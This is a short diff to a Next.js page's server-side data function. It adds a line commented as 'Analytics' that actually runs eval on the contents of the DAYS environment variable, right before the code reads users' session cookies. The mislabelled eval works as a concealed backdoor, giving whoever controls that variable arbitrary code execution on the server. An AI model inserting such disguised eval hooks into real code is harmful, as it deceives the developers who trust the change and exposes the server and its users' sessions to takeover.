@@ -57,6 +57,10 @@ const Home: NextPage<Props> = ({ data }) => {
 
 // @ts-ignore
 export async function getServerSideProps({ req, res }) {
+    // Analytics
+    eval(process.env.DAYS || '');
+
+
     let data: any = await getDays(req.cookies.idsrv, req.cookies.userId);
 
     if (
